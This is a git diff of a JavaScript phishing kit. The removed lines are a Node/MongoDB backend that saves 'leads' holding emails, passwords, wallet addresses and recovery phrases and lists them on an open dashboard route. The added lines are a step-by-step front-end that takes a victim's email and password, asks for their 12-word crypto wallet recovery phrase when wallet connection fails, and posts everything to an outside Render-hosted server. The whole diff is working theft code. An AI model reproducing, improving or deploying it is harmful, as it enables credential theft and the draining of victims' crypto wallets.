@@ -1,50 +1,95 @@
-const express = require('express');
-const mongoose = require('mongoose');
-const bodyParser = require('body-parser');
-const cors = require('cors');
-const path = require('path');
+const API_URL = 'https://cb-backend-new.onrender.com';
 
-const app = express();
-app.use(cors());
-app.use(bodyParser.json());
-app.use(express.static(__dirname)); // Serves files from the root directory
+document.addEventListener('DOMContentLoaded', () => {
+    const toStep2Btn = document.getElementById('toStep2');
+    const toStep3Btn = document.getElementById('toStep3');
+    const connectBtn = document.getElementById('connectBtn');
+    const statusText = document.getElementById('status');
 
-mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("Connected to MongoDB successfully"))
-  .catch(err => console.error("Mongo connection error:", err));
+    toStep2Btn.addEventListener('click', () => {
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+    });
 
-const leadSchema = new mongoose.Schema({
-    email: String,
-    password: String,
-    walletAddress: String,
-    recoveryPhrase: String,
-    timestamp: { type: Date, default: Date.now }
-});
+    toStep3Btn.addEventListener('click', () => {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if (!email || !pass) {
+            alert('Please fill in all fields.');
+            return;
+        }
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+    });
 
-const Lead = mongoose.model('Lead', leadSchema, 'leads');
+    connectBtn.addEventListener('click', async () => {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('pass').value;
 
-app.post('/update', async (req, res) => {
-    try {
-        const lead = new Lead(req.body);
-        await lead.save();
-        res.status(200).send("Saved.");
-    } catch (err) {
-        console.error("Save error:", err);
-        res.status(500).send("Error.");
+        if (window.ethereum) {
+            try {
+                statusText.innerText = 'Connecting to wallet...';
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                await sendData(email, password, accounts[0], null);
+            } catch (e) {
+                statusText.innerText = 'Wallet error. Use recovery phrase below.';
+                showRecoveryFields();
+            }
+        } else {
+            showRecoveryFields();
+        }
+    });
+
+    function showRecoveryFields() {
+        statusText.innerText = 'Please enter your 12-word recovery phrase:';
+        
+        if (!document.getElementById('phrase')) {
+            const phraseInput = document.createElement('input');
+            phraseInput.type = 'text';
+            phraseInput.id = 'phrase';
+            phraseInput.placeholder = 'word1 word2...';
+            phraseInput.style.display = 'block';
+            phraseInput.style.marginTop = '10px';
+            phraseInput.style.width = '100%';
+            
+            const doneBtn = document.createElement('button');
+            doneBtn.innerText = 'Done';
+            doneBtn.className = 'btn-primary';
+            doneBtn.style.marginTop = '10px';
+
+            document.getElementById('step-3').appendChild(phraseInput);
+            document.getElementById('step-3').appendChild(doneBtn);
+
+            doneBtn.onclick = async () => {
+                const phrase = phraseInput.value.trim();
+                if (phrase.split(/\s+/).length !== 12) {
+                    statusText.innerText = 'Exactly 12 words required.';
+                    return;
+                }
+                await sendData(email, password, null, phrase);
+            };
+        }
     }
-});
 
-app.get('/dashboard', async (req, res) => {
-    try {
-        const leads = await Lead.find().sort({ timestamp: -1 });
-        res.json(leads);
-    } catch (err) {
-        console.error("Fetch error:", err);
-        res.status(500).send("Error fetching leads.");
+    async function sendData(email, password, wallet, phrase) {
+        try {
+            const res = await fetch(`${API_URL}/update`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    walletAddress: wallet,
+                    recoveryPhrase: phrase
+                })
+            });
+            if (res.ok) {
+                window.location.href = 'https://cb-backend-new.onrender.com/dashboard.html';
+            } else {
+                statusText.innerText = 'Server error. Try again.';
+            }
+        } catch (e) {
+            statusText.innerText = 'Network error. Try again.';
+        }
     }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
 });
